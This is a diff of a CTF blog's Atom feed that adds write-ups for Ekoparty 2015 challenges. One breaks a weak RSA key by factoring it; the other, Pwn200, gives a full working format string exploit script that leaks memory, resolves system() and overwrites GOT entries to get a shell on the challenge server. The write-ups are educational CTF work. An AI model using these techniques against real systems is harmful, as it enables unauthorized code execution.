@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Ctf | staring into /dev/null]]></title>
   <link href="http://barrebas.github.io/blog/categories/ctf/atom.xml" rel="self"/>
   <link href="http://barrebas.github.io/"/>
-  <updated>2015-08-18T21:42:50+02:00</updated>
+  <updated>2015-09-21T23:59:38+02:00</updated>
   <id>http://barrebas.github.io/</id>
   <author>
     <name><![CDATA[barrebas]]></name>
@@ -12,6 +12,630 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Ekoparty - Cry100]]></title>
+    <link href="http://barrebas.github.io/blog/2015/09/21/ekoparty-cry100/"/>
+    <updated>2015-09-21T23:54:27+02:00</updated>
+    <id>http://barrebas.github.io/blog/2015/09/21/ekoparty-cry100</id>
+    <content type="html"><![CDATA[<p>We&rsquo;re given a public key and a encrypted flag, with the task to get the private key. I&rsquo;m not very good at crypto challenges so I wanted to see if I could break this one and learn something in the process.</p>
+
+<!--more-->
+
+
+<p>The public key is an RSA key:</p>
+
+<pre><code class="bash">$ openssl rsa -inform PEM -pubin -in public.key -text -noout 
+Public-Key: (2070 bit)
+Modulus:
+    25:b1:8b:f5:f3:89:09:7d:17:23:78:66:bb:51:cf:
+    f8:de:92:24:53:74:9e:bc:40:3b:09:95:c9:7c:0e:
+    38:6d:46:c1:61:ca:df:f7:7c:69:86:0d:ae:47:91:
+    c2:14:cf:84:87:aa:aa:9f:26:e9:20:a9:77:83:49:
+    06:03:8a:ef:b5:c3:08:27:df:cf:3f:c9:e9:76:95:
+    44:f9:4e:07:cd:fe:08:72:03:9a:3a:62:62:11:66:
+    78:b2:61:fb:2d:6b:9d:32:53:9e:92:a1:53:b3:67:
+    56:29:ba:b3:94:2e:7d:35:e3:0f:7e:ef:5a:bf:1c:
+    50:d7:97:d0:cc:88:e1:bd:cc:fd:1a:12:ea:6f:7e:
+    f7:5c:37:27:db:df:2e:78:0f:34:28:ae:8f:7a:4f:
+    b7:a8:9f:18:4a:36:50:32:b1:53:f8:42:5e:84:57:
+    50:eb:2b:7a:bc:02:dc:15:ce:02:07:50:7a:a9:50:
+    86:3b:b8:48:0a:78:02:8d:d6:29:79:94:4d:6c:63:
+    3f:af:a1:03:e4:db:28:ce:87:f5:a0:c6:ed:4a:2f:
+    26:64:42:7f:56:5c:77:81:ab:61:91:45:6d:97:1c:
+    7f:fa:39:52:72:37:4c:ec:01:55:e5:f9:11:89:db:
+    74:2e:4c:28:b0:3a:0f:a1:1c:ff:b0:31:73:d2:a4:
+    cc:e6:ae:53
+Exponent: 65537 (0x10001)
+</code></pre>
+
+<p>It has a rather weird number of bits, not a multiple of 256. The modulus is converted to hex using python and yields:</p>
+
+<pre><code>n = 79832181757332818552764610761349592984614744432279135328398999801627880283610900361281249973175805069916210179560506497075132524902086881120372213626641879468491936860976686933630869673826972619938321951599146744807653301076026577949579618331502776303983485566046485431039541708467141408260220098592761245010678592347501894176269580510459729633673468068467144199744563731826362102608811033400887813754780282628099443490170016087838606998017490456601315802448567772411623826281747245660954245413781519794295336197555688543537992197142258053220453757666537840276416475602759374950715283890232230741542737319569819793988431443
+</code></pre>
+
+<p>Hmm. Since the modulus <code>n</code> is made from the product of two primes, we&rsquo;d better find those primes. Luckily, I found another <a href="http://hacktracking.blogspot.nl/2013/11/cscamp-ctf-quals-2k13-crypto-public-is.html">writeup</a> and a website called <a href="http://factordb.com/index.php?query=79832181757332818552764610761349592984614744432279135328398999801627880283610900361281249973175805069916210179560506497075132524902086881120372213626641879468491936860976686933630869673826972619938321951599146744807653301076026577949579618331502776303983485566046485431039541708467141408260220098592761245010678592347501894176269580510459729633673468068467144199744563731826362102608811033400887813754780282628099443490170016087838606998017490456601315802448567772411623826281747245660954245413781519794295336197555688543537992197142258053220453757666537840276416475602759374950715283890232230741542737319569819793988431443">factordb.com</a>. Factordb does <em>exactly</em> what it says on the box and yields two factors, <code>3133337</code> and another large number. The first number made me think I was on the right way!</p>
+
+<p>Now, we need to reconstruct the key. We have <code>n</code>, <code>p</code> and <code>q</code> which is all we need. I couldn&rsquo;t decrypt the message in Python, as Python&rsquo;s cryptolib requires the modulus to be a multiple of 256 bits. So I resorted to the voodoo magic that is <code>openssl</code>. I found this nice post on stackoverflow <a href="https://stackoverflow.com/questions/19850283/how-to-generate-rsa-keys-using-specific-input-numbers-in-openssl">about creating specific rsa keys</a>.</p>
+
+<p>I followed that post, computing:</p>
+
+<pre><code>d mod(p-1) = e1
+d mod(q-1) = e2
+q^-1 mod p = coeff
+</code></pre>
+
+<p>for which I needed</p>
+
+<pre><code class="python">    def egcd(a, b):
+        if a == 0:
+            return (b, 0, 1)
+        else:
+            g, y, x = egcd(b % a, a)
+            return (g, x - (b // a) * y, y)
+
+    def modinv(a, m):
+        g, x, y = egcd(a, m)
+        if g != 1:
+            raise Exception('modular inverse does not exist')
+        else:
+            return x % m
+</code></pre>
+
+<p>Then I put everything in a file called <code>newkey.der</code>:</p>
+
+<pre><code>asn1=SEQUENCE:rsa_key
+
+[rsa_key]
+version=INTEGER:0
+modulus=INTEGER:79832181757332818552764610761349592984614744432279135328398999801627880283610900361281249973175805069916210179560506497075132524902086881120372213626641879468491936860976686933630869673826972619938321951599146744807653301076026577949579618331502776303983485566046485431039541708467141408260220098592761245010678592347501894176269580510459729633673468068467144199744563731826362102608811033400887813754780282628099443490170016087838606998017490456601315802448567772411623826281747245660954245413781519794295336197555688543537992197142258053220453757666537840276416475602759374950715283890232230741542737319569819793988431443
+pubExp=INTEGER:65537    
+privExp=INTEGER:406853230956379689450620815713768871010712825839536410687962650677800895818003893712259622281477453292088146173840036827322518131453630576229976208523593618949818777897059256426591560532784635697190752924923710375949616954069804342573867253630978123632384795587951365482103468722384133084798614863870775897915929475258974188300927376911833763105616386167881813301748585233563049693794370642976326692672223638908164822104832415788577945314264232531947860576966629150456995512932232264881080618006698700677529111454508900582785420549466798020451488168615035256292977390692401388790460066327347700109341639992159475755036449
+p=INTEGER:25478326064937419292200172136399497719081842914528228316455906211693118321971399936004729134841162974144246271486439695786036588117424611881955950996219646807378822278285638261582099108339438949573034101215141156156408742843820048066830863814362379885720395082318462850002901605689761876319151147352730090957556940842144299887394678743607766937828094478336401159449035878306853716216548374273462386508307367713112073004011383418967894930554067582453248981022011922883374442736848045920676341361871231787163441467533076890081721882179369168787287724769642665399992556052144845878600126283968890273067575342061776244939
+q=INTEGER:3133337
+e1=INTEGER:15320351458978192768467039741691432413958180349660930794740289485182452764579534136107456333762920952821710744567765011085892394594373698903583015958298729593743757394184665648601970820474550408544396720336394444082148339685815042712020243239641617201526913490150693257135882730015443734409342942381805505660243891614007699009146733904940642377373537806159587666380328759209553248526202577679304907571591265191240376778645354498599063176881375334380848007142765855272411310242667619720799140338871500103278100940728801960485534826631133256077779493381175185896255651752489800973249824932460228998596930117032675866465
+e2=INTEGER:817841
+coeff=INTEGER:0
+</code></pre>
+
+<p>The <code>privExp</code> was calculated like this:</p>
+
+<pre><code class="python">import gmpy
+
+def egcd(a, b):
+    if a == 0:
+        return (b, 0, 1)
+    else:
+        g, y, x = egcd(b % a, a)
+        return (g, x - (b // a) * y, y)
+
+def modinv(a, m):
+    g, x, y = egcd(a, m)
+    if g != 1:
+        raise Exception('modular inverse does not exist')
+    else:
+        return x % m
+
+p = 25478326064937419292200172136399497719081842914528228316455906211693118321971399936004729134841162974144246271486439695786036588117424611881955950996219646807378822278285638261582099108339438949573034101215141156156408742843820048066830863814362379885720395082318462850002901605689761876319151147352730090957556940842144299887394678743607766937828094478336401159449035878306853716216548374273462386508307367713112073004011383418967894930554067582453248981022011922883374442736848045920676341361871231787163441467533076890081721882179369168787287724769642665399992556052144845878600126283968890273067575342061776244939
+q = 3133337
+totien = (p-1) * (q-1)
+e = 65537
+d = modinv(e,totien)
+print d
+</code></pre>
+
+<p>I then ran <code>$ openssl asn1parse -genconf  newkey.der -out key.der</code>. After mucking around with the flag, I verified I had the right private key by encrypting a test message with the public key. I noticed that the flag was base64 encoded whereas my encrypted message wasn&rsquo;t&hellip;</p>
+
+<pre><code class="bash">$ cat flag.enc |base64 -d &gt; test.enc
+$ openssl rsautl -in test.enc -out /dev/tty -inkey private.key -decrypt -oaep
+EKO{classic_rsa_challenge_is_boring_but_necessary}
+</code></pre>
+
+<p>That last <code>openssl</code> command was just tested with <code>-raw</code> and -<code>oaep</code> (options for padding). <code>-oaep</code> worked!</p>
+
+<p>Flag was <code>EKO{classic_rsa_challenge_is_boring_but_necessary}</code>. I learned something \o/</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Ekoparty - Pwn200]]></title>
+    <link href="http://barrebas.github.io/blog/2015/09/21/ekoparty-pwn200/"/>
+    <updated>2015-09-21T23:47:44+02:00</updated>
+    <id>http://barrebas.github.io/blog/2015/09/21/ekoparty-pwn200</id>
+    <content type="html"><![CDATA[<p>Where on earth shall we begin? This one kept us busy for quite some time. The challenge gives no binary, just an address to connect to. Upon connecting, we get some kind of echo server. We quickly noticed a string format vulnerability:</p>
+
+<!--more-->
+
+
+<pre><code>$ nc challs.ctf.site 20002
+&lt;Simple loop greetings v1.3.3.7&gt;
+[!] Type bye to quit
+Enter your name: %17$s
+Hi 3k0_p4rty_2015!
+</code></pre>
+
+<p>However this wasn&rsquo;t the flag. As we&rsquo;ll see later, this was part of the challenge. We started dumping the entire binary using the string format vuln. Our format string can be found at offset 8 with 1 byte of padding:</p>
+
+<p>bAAAA%8$x</p>
+
+<pre><code>nc challs.ctf.site 20002
+&lt;Simple loop greetings v1.3.3.7&gt;
+[!] Type bye to quit
+Enter your name: bAAAA%8$x
+Hi bAAAA41414141
+</code></pre>
+
+<p>From the raw dump, we reconstructed parts of the binary. We came across a string that said &ldquo;OMG! Well done, here&rsquo;s your flag&rdquo; or something along those lines. Looking through the raw dump, we found where that string is referenced. Disassembling with radare2 gave us this:</p>
+
+<pre><code>bas@tritonal:~$ rasm2 -d -o 0x13370861 -
+7517c7442404970a37138d45e7890424e86afcffff85c074188d45e789442404c704249a0a3713e883fcffffe9a52a2a2ac70424a20a3713e872fcffff8d45e7890424e867fcffffc70424a60a3713e8cbfcffff8d45e789442404c70424a70a3713e828fcffff85c07566c70424c40a3713e838fcffffa10821371389442404c70424c1203713e8f0fdffff8945dca10821371389442404c70424cc2037130cd8fdffff8945e08b4545dc890424e8f6fbffff8b45dc890424
+disassemble error at offset 162
+jnz 0x1337087a
+mov dword [esp+0x4], 0x13370a97
+lea eax, [ebp-0x19]
+mov [esp], eax
+call dword 0x133704e0
+test eax, eax
+jz 0x13370892
+lea eax, [ebp-0x19]
+mov [esp+0x4], eax
+mov dword [esp], 0x13370a9a ; 
+call dword 0x13370510       ; puts? (value in got is 0xb7e76c40)
+jmp dword 0x3d613337
+mov dword [esp], 0x13370aa2 ; Hi
+call dword 0x13370510
+lea eax, [ebp-0x19]
+mov [esp], eax
+call dword 0x13370510
+mov dword [esp], 0x13370aa6
+call dword 0x13370580       ; ? (value in got is 0xb7e8ec10)
+lea eax, [ebp-0x19]
+mov [esp+0x4], eax
+mov dword [esp], 0x13370aa7 ; Welcome to ekoparty 2015!
+call dword 0x133704f0       ; strcmp? (value in got is 0xb7f60b60)
+test eax, eax
+jnz 0x13370932
+mov dword [esp], 0x13370ac4 ; OMG! nice work, your flag is:
+call dword 0x13370510       ; puts?
+mov eax, [0x13372108]       ; -&gt; 0x13373008, contains '47fa'
+mov [esp+0x4], eax
+mov dword [esp], 0x133720c1 ; qs'HG, 7173271f..
+call dword 0x133706dd       ; see below
+mov [ebp-0x24], eax
+mov eax, [0x13372108]
+mov [esp+0x4], eax
+mov dword [esp], 0x133720cc ; 0x1d0a0c56
+or al, 0xd8
+std
+invalid
+</code></pre>
+
+<p>Since our input can never be larger than 12 bytes, we can never win the strcmp with <code>Welcome to ekoparty 2015</code>. From here, we tried a lot of things. The 12 char input limit was annoying, cos we couldn&rsquo;t really write anything, anywhere:</p>
+
+<p><code>A\xde\xad\xbe\xef%255c%8$hn</code> was 15 chars&hellip; So we set out to make a write() function using the format string vuln.</p>
+
+<p>On the stack, there are many DWORDS. Some of them contain stack addresses. Some of those addresses refer to other stack addresses (they&rsquo;re usually stack frame pointers). Using three memory positions, we could construct a write function using format string argument 25, 61 and 124 (ASLR is off so the addresses remain constant). Here&rsquo;s how:</p>
+
+<p>$25 contains the address of $61. Let&rsquo;s assume $25 contains 0xfffff080.</p>
+
+<p>$61 is at 0xfffff080 and contains 0xfffff1a0, which is $124 (math doesn&rsquo;t work out but bear with me).</p>
+
+<p>$124 contains nothing of interest, and isn&rsquo;t used by the binary.</p>
+
+<p>If we now use the format string, we use $61 to write to $124, and $25 to update $61. Finally, once we&rsquo;ve written out an address in $124, we can use the format string to write to that location.</p>
+
+<p>Let&rsquo;s assume we want to write 0x41414141 to 0x804b020. We first do this:</p>
+
+<pre><code>%32c%61$hhn (write 0x20 to 0xfffff1a0). 
+</code></pre>
+
+<p>Then, we update the pointer at $61 by writing to $25:</p>
+
+<pre><code>%161c%25$hhn
+</code></pre>
+
+<p>So $61 will now contain 0xfffff1a1. Then we write to $124 again via $61:</p>
+
+<pre><code>%176c%61$hhn (write 0xb0 to 0xfffff1a1). 
+</code></pre>
+
+<p>Etc until we have 0x804b020 at $124. Then we write using $124:</p>
+
+<pre><code>%65c%124$hhn
+</code></pre>
+
+<p>And we&rsquo;ll have written the first byte to 0x804b020. We repeat this process for the other bytes&hellip;</p>
+
+<p>With our new and shiny write() function we set out to break this challenge. We first tried truncating the string &ldquo;Welcome to ekoparty 2015!&rdquo; in memory, so we could have an input that would fit the 12 char limit. Writing to that location didn&rsquo;t work, presumably cos that string was in non-writeable memory. Remember, we needed to enter the code path here:</p>
+
+<pre><code>mov dword [esp], 0x13370aa7 ; Welcome to ekoparty 2015!
+call dword 0x133704f0       ; strcmp? (value in got is 0xb7f60b60)
+test eax, eax
+jnz 0x13370932
+mov dword [esp], 0x13370ac4 ; OMG! nice work, your flag is:
+call dword 0x13370510       ; puts?
+mov eax, [0x13372108]       ; -&gt; 0x13373008, contains '47fa'
+mov [esp+0x4], eax
+mov dword [esp], 0x133720c1 ; qs'HG, 7173271f..
+call dword 0x133706dd       ; see below
+mov [ebp-0x24], eax
+mov eax, [0x13372108]
+mov [esp+0x4], eax
+mov dword [esp], 0x133720cc ; 0x1d0a0c56
+</code></pre>
+
+<p>We dumped and reversed the function at <code>0x133720cc</code>, which apparently decodes the flag. However, we where only able to get the pieces <code>EKO{</code> and <code>b4by</code>. The dump process wasn&rsquo;t perfect, so we continued.</p>
+
+<p>So how could we get strcmp() to return 0? By overwriting the value in the got with a location that does <code>xor eax, eax; ret</code>. We dumped bytes around the strcmp pointer (ASLR was off so libc was at a static position) and indeed, we identified a rop-like gadget that did just that! Careful overwriting of the got pointer of strcmp in two steps was necessary, but again we lucked out: strcmp was at 0xb7f60b60, the <code>xor eax, eax</code> gadget was at 0xb7f61fc4. At 0xb7f61c60, there was this perfect gadget:</p>
+
+<pre><code>movzx ecx, byte [eax+0x5]
+movzx eax, byte [edx+0x5]
+sub eax, ecx
+ret
+</code></pre>
+
+<p>In two steps, we overwrote strcmp (we can&rsquo;t have the got pointer pointing to illegal instructions, cos that would make the binary crash before we can overwrite the next value!) with the xor eax gadget&hellip; and we got something like this:</p>
+
+<pre><code>OMG! nice work, your flag is: EKO{
+</code></pre>
+
+<p>And then nothing?! We overwrote the free() got pointer with puts and this dumped more text, convincing us that the overwrite was working correctly. This lead us to believe the binary was broken&hellip; Which indeed it turned out to be, later on.</p>
+
+<p>Next, loads of failed attempts later, we stumbled upon <a href="https://wapiflapi.github.io/2014/11/17/hacklu-oreo-with-ret2dl-resolve/">this writeup of another challenge</a> that uses ret2dl. In other words, abuse the symbol resolver. Quickly after that, we found another good writeup, using a slightly easier technique. It <a href="https://github.com/mrmacete/writeups/tree/master/wapiflapi-exrs/sploit/s7">traverses the link_map</a> found in memory to grab <code>system()</code>.</p>
+
+<p>This turned out to work. We traversed the link_map by hand, adjusting the leaked bytes from time to time (remember, printf chokes on nul bytes).</p>
+
+<p>At the start of the got, we find these bytes:</p>
+
+<pre><code>0x13371f14 ; .dynamic
+0xb7fff938 ; *link_map
+0xb7ff24f0 ; *dl-resolve
+</code></pre>
+
+<p>We take 0xb7fff938, the *link_map, and dump from there. link_map looks like this:</p>
+
+<pre><code class="c">struct link_map
+  {
+    /* These first few members are part of the protocol with the debugger.
+       This is the same format used in SVR4.  */
+
+    ElfW(Addr) l_addr;          /* Base address shared object is loaded at.  */
+    char *l_name;               /* Absolute file name object was found in.  */
+    ElfW(Dyn) *l_ld;            /* Dynamic section of the shared object.  */
+    struct link_map *l_next, *l_prev; /* Chain of loaded objects.  */
+  };
+</code></pre>
+
+<p>So at 0xb7fff938 we find:
+<code>
+0x746e450a ; base_addr.. not correct due to printf
+0xb7fffc24 ; name! empty
+0x13371f14 ; the bin itself... not useful.
+0xb7fffc28 ; ptr-&gt;next
+</code></p>
+
+<p>This is the binary. On to the next one at 0xb7fffc28, which was linux-gate&hellip; Then the next one was indeed libc! This was confirmed by reading link_map->l_name. We now had the dynamic section of libc, time to parse it for system. Soon, using the printf format string vulnerability and a messy python script, we were dumping symbols. After about an hour, we hit the jackpot:</p>
+
+<pre><code>[+] Opening connection to challs.ctf.site on port 20002: Done
+0xb7e2dec8 0x0
+0xb7e2ded8 0x1da8
+1768709983 __li
+0x0
+0xb7e2dee8 0xbde
+1819570783 _rtl
+0x0
+0xb7e2def8 0x45d1
+1768709983 __li
+0x0
+0xb7e2df08 0x13f4
+...
+0xb7e2f948 0x3176
+signal
+0xb7e2f9a8 0xeab
+puts
+0xb7e30208 0xa3e
+&lt;empty&gt;
+
+0xb7e30588 0x3063
+__libc_system
+Enter your name:
+[!] found system!0x3fcd0 0xb7e69cd0
+</code></pre>
+
+<p>We had the address of system! Now, the plan of attack was as follows:</p>
+
+<ul>
+<li>overwrite free@got with system</li>
+<li>set strcmp to the <code>xor eax, eax; ret</code> gadget</li>
+<li>supply <code>/bin/sh</code> as input</li>
+<li>trigger free() with input, which is now system()</li>
+<li>receive shell</li>
+</ul>
+
+
+<p>This <em>almost</em> worked out, but we set strcmp to 0xb7f61f60 and that turned out to be enough. We landed a shell!</p>
+
+<p>The poc we used:</p>
+
+<pre><code class="python">import socket, struct, telnetlib, time
+from pwn import *
+
+context(arch='i386', os='linux')
+def p(x):
+        return struct.pack('&lt;I', x)
+
+def read1(address):
+    conn.send("%64c%25$hhn")           # 0xbffff940
+    conn.recv(200)
+    conn.send("%"+str(256)+"c%61$hhn")           # set byte at 0xbf..40 to '3c'
+    conn.recv(300)
+
+    if (address &amp; 0xff):
+        conn.send("%64c%25$hhn")           # 0xbffff940
+        conn.recv(200)
+        conn.send("%"+str(address &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..40 to '3c'
+        conn.recv(300)
+
+    conn.send("%65c%25$hhn")           # next byte, 0xbffff941
+    conn.recv(200)
+    conn.send("%"+str((address &gt;&gt; 8) &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..41 to '20'
+    conn.recv(300)
+
+    conn.send("%66c%25$hhn")           # next byte, 0xbffff942
+    conn.recv(200)
+    conn.send("%"+str((address &gt;&gt; 16) &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..42 to '37'
+    conn.recv(300)
+
+    conn.send("%67c%25$hhn")           # final byte, 0xbffff943
+    conn.recv(200)
+    conn.send("%"+str((address &gt;&gt; 24) &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..43 to '13'
+    conn.recv(300)
+
+    conn.send("%124$s")
+
+    data = conn.recv(200)
+    if data[4:7] == 'Ent':
+        return 0
+    return ord(data[3:4])
+
+def read4(address):
+    value = 0
+    for i in range(4):
+        #value &lt;&lt;= 8
+        value += read1(address+i) &lt;&lt; (8*i)
+
+    return value
+
+
+def leak(address):
+    conn.send("%64c%25$hhn")           # 0xbffff940
+    conn.recv(200)
+    conn.send("%"+str(256)+"c%61$hhn")           # set byte at 0xbf..40 to '3c'
+    conn.recv(300)
+
+    if (address &amp; 0xff):
+        conn.send("%64c%25$hhn")           # 0xbffff940
+        conn.recv(200)
+        conn.send("%"+str(address &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..40 to '3c'
+        conn.recv(300)
+
+    conn.send("%65c%25$hhn")           # next byte, 0xbffff941
+    conn.recv(200)
+    conn.send("%"+str((address &gt;&gt; 8) &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..41 to '20'
+    conn.recv(300)
+
+    conn.send("%66c%25$hhn")           # next byte, 0xbffff942
+    conn.recv(200)
+    conn.send("%"+str((address &gt;&gt; 16) &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..42 to '37'
+    conn.recv(300)
+
+    conn.send("%67c%25$hhn")           # final byte, 0xbffff943
+    conn.recv(200)
+    conn.send("%"+str((address &gt;&gt; 24) &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..43 to '13'
+    conn.recv(300)
+
+    conn.send("%124$s")
+    data = conn.recv(200)
+    return data[3:]
+
+def write1(what, where):
+#       argument 25 contains 0xbffff844,
+#                               which points to 0xbffff958
+#       so we can use 25 to modify position 61 to write something on the stack!
+#       addr = 0xbffff758 # = argument 2
+    conn.send("%64c%25$hhn")           # 0xbffff940
+    conn.recv(200)
+    conn.send("%"+str(where &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..40 to '3c'
+    conn.recv(300)
+
+    conn.send("%65c%25$hhn")           # next byte, 0xbffff941
+    conn.recv(200)
+    conn.send("%"+str((where &gt;&gt; 8) &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..41 to '20'
+    conn.recv(300)
+
+    conn.send("%66c%25$hhn")           # next byte, 0xbffff942
+    conn.recv(200)
+    conn.send("%"+str((where &gt;&gt; 16) &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..42 to '37'
+    conn.recv(300)
+
+    conn.send("%67c%25$hhn")           # final byte, 0xbffff943
+    conn.recv(200)
+    conn.send("%"+str((where) &gt;&gt; 24 &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..43 to '13'
+    conn.recv(300)
+
+    # write byte
+    if ord(what) &lt; 100:
+        conn.send("%"+str(ord(what))+"c%124$hhn")
+    else:
+        conn.send("%"+str(ord(what))+"c%124$hn")
+    conn.recv(300)
+
+def writebytes(what, where):
+    for i in range(len(what)):
+        write1(what[i], where+i)
+
+global conn
+conn = remote('challs.ctf.site', 20002)
+conn.recv(200)
+
+print "[+] writing /bin/sh to 0x13373008"
+writebytes('/bin/sh', 0x13373008)
+
+print "[+] writing system() to 0x13372020"
+writebytes(struct.pack('I', 0xb7e69cd0), 0x13372020)
+
+print "[+] fucking up strcmp()"
+writebytes("\x1f", 0x13372011)
+
+conn.interactive()
+</code></pre>
+
+<p>Yeah. Pretty horrible.</p>
+
+<pre><code>bas@tritonal:~/bin/ekoparty-ctf/pwn20$ python pwnpoc.py 
+[+] Opening connection to challs.ctf.site on port 20002: Done
+[+] writing /bin/sh to 0x13373008
+[+] writing system() to 0x13372020
+[+] fucking up strcmp()
+[*] Switching to interactive mode
+$ id
+$ id
+uid=1001(simple) gid=1001(simple) groups=1001(simple)
+$ cd /home/simple
+$ ls -al
+total 68
+drwxr-x--- 2 simple simple  4096 Sep 17 13:45 .
+drwxr-xr-x 6 root   root    4096 Sep 12 21:10 ..
+-rw------- 1 simple simple   145 Sep 12 21:13 .bash_history
+-rw-r--r-- 1 simple simple   220 Oct  7  2014 .bash_logout
+-rw-r--r-- 1 simple simple  3637 Oct  7  2014 .bashrc
+-rw-r--r-- 1 simple simple   675 Oct  7  2014 .profile
+-rwxr-xr-x 1 root   root   27095 Nov 17  2011 checksec.sh
+-rw-r--r-- 1 simple simple    35 Sep 14 23:37 flag
+-rw-r----- 1 root   simple  1904 Aug 27 01:08 fmt_001.c
+-rwxr-x--- 1 root   simple  5776 Aug 27 01:08 greetings
+Hi id
+
+OMG! nice work, your flag is: ^\x10LnBye!
+[*] Got EOF while reading in interactive
+$  
+</code></pre>
+
+<p>After 10 seconds, we got kicked out, but that was enough time to grab some files. Sadly, the flag file was not the flag&hellip; someone planted it there (thanks! but no thanks). So we grabbed the C source file:</p>
+
+<pre><code class="c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include  &lt;signal.h&gt;
+
+char *mkey;
+unsigned char mkey_crypt[] = { "\x07\x5b\x54\x03\x40\x0f\x4c\x1a\xb2\x0b\x0c\x0b\x04\x77\x1e\x24\x4c\x79\x42\xe7\x2c\xb4\xbf\xa0\x40\x7a\x79\x7a\x32\x0c\x68\xb9\x32\xb7\xf0\x62\xa7\xac\xa6\xe0\x68\x6a\x6f\x54\x28\x59\xa8\x3d\xee\x97\x04\x93\x9f\xcd\xf0\x5b\x0a\x08\x0b\x3e\x5f\xcd\x5f\xaf" };  
+unsigned char fmt[] = { "\x71\x73\x27\x1f\x1d\x48\x47" };
+unsigned char flag[] = { "\x56\x0c\x0a\x1d\x67\x08\x42\x18\x57\x5c\x53\x4f\x1a\x04\x72\x21\x18\x3a\x31\x05\x49\x26\x2c\x18\x09\x1e\x1a\x70\x5c\x6b" };
+
+char *decrypt(const char *msg, const char *key)
+{
+    int len_key = strlen(key);
+    int len_msg = strlen(msg);
+    int i, j;
+    char *out = (char *)malloc(len_key + 1);
+    if (!out)
+    {
+        printf("WTF no memory :s");
+        return NULL;
+    }
+    for (i = 0; i &lt; len_msg &amp;&amp; i &lt; sizeof(len_msg); i++)
+    {
+        out[i] = msg[i] ^ (i + key[i%len_key]);
+    }
+    return out;
+}
+
+void handler(int num)
+{
+    puts("Bye!");
+    exit(-1);
+}
+
+void process()
+{
+    char buff[13];
+    puts("&lt;Simple loop greetings v1.3.3.7&gt;");
+    puts("[!] Type bye to quit");
+    while (1)
+    {
+        alarm(10);
+        printf("Enter your name: ");
+        fflush(stdout);
+        memset(buff, 0, sizeof(buff));
+        read(0, buff, sizeof(buff) - 1);
+        if (strstr(buff, "bye"))
+        {
+            puts("Bye!");
+            break;
+        }
+        if (strstr(buff, "%n") || strstr(buff, "%N"))
+        {
+            //p: %s\n", buff);
+            break;
+        }
+        printf("Hi ");printf(buff);puts("");
+        if (!strcmp("Welcome to ekoparty 2015!", buff))
+        {
+            printf("OMG! nice work, your flag is: ");
+            char *fmt_ = decrypt(fmt, mkey);
+            char *flag_ = decrypt(flag, mkey);
+            printf(fmt_, flag_);
+            free(fmt_);
+            free(flag_);
+            break;
+        }
+    }
+}
+
+//gcc -m32 Wl,-Ttext-segment=0x13370000 -o greetings fmt_001.c ; strip greetings
+int main(int argc, char **argv)
+{
+    signal(SIGALRM, handler);
+    mkey = decrypt(mkey_crypt, "3k0_p4rty_2015!");
+    process();
+    free(mkey);
+}
+</code></pre>
+
+<p>Spot the mistake!</p>
+
+<p>Found it? Yeah:</p>
+
+<pre><code>for (i = 0; i &lt; len_msg &amp;&amp; i &lt; sizeof(len_msg); i++)
+</code></pre>
+
+<p>Thanks. Anyway, we reimplemented this file in Python (honestly couldn&rsquo;t get the C program to run without segfaulting, bleh).</p>
+
+<pre><code class="python">def decrypt(msg, key):
+    out = ""
+
+    for i in range(len(msg)):
+        out += chr(ord(msg[i]) ^ (ord(key[i % len(key)]) + i))
+
+    return out
+
+
+mkey = decrypt("\x07\x5b\x54\x03\x40\x0f\x4c\x1a\xb2\x0b\x0c\x0b\x04\x77\x1e\x24\x4c\x79\x42\xe7\x2c\xb4\xbf\xa0\x40\x7a\x79\x7a\x32\x0c\x68\xb9\x32\xb7\xf0\x62\xa7\xac\xa6\xe0\x68\x6a\x6f\x54\x28\x59\xa8\x3d\xee\x97\x04\x93\x9f\xcd\xf0\x5b\x0a\x08\x0b\x3e\x5f\xcd\x5f\xaf", "3k0_p4rty_2015!")
+
+print decrypt("\x71\x73\x27\x1f\x1d\x48\x47", mkey)
+print decrypt("\x56\x0c\x0a\x1d\x67\x08\x42\x18\x57\x5c\x53\x4f\x1a\x04\x72\x21\x18\x3a\x31\x05\x49\x26\x2c\x18\x09\x1e\x1a\x70\x5c\x6b", mkey)
+</code></pre>
+
+<p>Which <em>finally</em> gave us the flag:</p>
+
+<pre><code>EKO{\%s}
+b4by_3xpl0it_FMT_str1ng_FTW!#$
+</code></pre>
+
+<p>The flag was <code>EKO{b4by_3xpl0it_FMT_str1ng_FTW!#$}</code>. Too bad the challenge was broken, nice to learn a new technique!</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[CAMP CTF - Dkm]]></title>
@@ -662,426 +1286,6 @@ print payload
 </code></pre>
 
 <p>Running this against the remote binary using <code>nc</code> gave <code>The flag is: CAMP15_337deec05ccc63b1168ba3379ae4d65854132604</code>. Done!</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[CAMP CTF - Bitterman &amp; Phobos]]></title>
-    <link href="http://barrebas.github.io/blog/2015/08/18/camp-ctf-bitterman-and-phobos/"/>
-    <updated>2015-08-18T21:32:18+02:00</updated>
-    <id>http://barrebas.github.io/blog/2015/08/18/camp-ctf-bitterman-and-phobos</id>
-    <content type="html"><![CDATA[<p>I rolled into the CampCTF while Swappage was already working on it. He had started on bitterman, a 400 point challenge.</p>
-
-<!--more-->
-
-
-<p>We&rsquo;re given a 64-bit ELF binary and Swappage also managed to obtain the corresponding libc. Upon starting the binary, we&rsquo;re presented with the following:</p>
-
-<pre><code class="bash">&gt; What's your name? 
-BBBB
-Hi, BBBB
-x
-&gt; Please input the length of your message: 
--1  
-&gt; Please enter your text: 
-LSJFLSDJF
-&gt; Thanks!
-</code></pre>
-
